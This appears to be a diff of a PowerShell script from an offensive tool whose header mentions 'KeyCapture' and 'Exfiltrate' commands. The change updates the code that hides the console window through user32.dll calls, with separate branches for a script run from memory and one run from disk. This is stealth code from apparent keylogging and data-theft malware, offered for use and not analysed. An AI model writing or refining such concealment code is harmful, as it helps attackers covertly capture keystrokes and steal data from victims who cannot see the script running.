@@ -35,15 +35,23 @@ Edit file contents to 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and re
 
 # HIDE THE WINDOW - Change to 1 to hide the console window
 $HideWindow = 1
-
 If ($HideWindow -gt 0){
-$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -Member $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-$Host.UI.RawUI.WindowTitle = 'hideme'
-$Proc = (Get-Process | Where-Object {$_.MainWindowTitle -eq 'hideme'})
-$hwnd = $Proc.MainWindowHandle
-$Type::ShowWindowAsync($hwnd, 0)
+    If ($PSScriptRoot.length -eq 0){
+        write-host "Script NOT Local"
+        $Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+        add-type -name win -member $Import -namespace native;
+        [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+    }
+    else{
+        write-host "Script IS Local"
+        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+        $Type = Add-Type -Member $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+        $hwnd = (Get-Process -PID $pid).MainWindowHandle
+        $Host.UI.RawUI.WindowTitle = 'hideme'
+        $Proc = (Get-Process | Where-Object {$_.MainWindowTitle -eq 'hideme'})
+        $hwnd = $Proc.MainWindowHandle
+        $Type::ShowWindowAsync($hwnd, 0)
+    }
 }
 
 # Check version and update
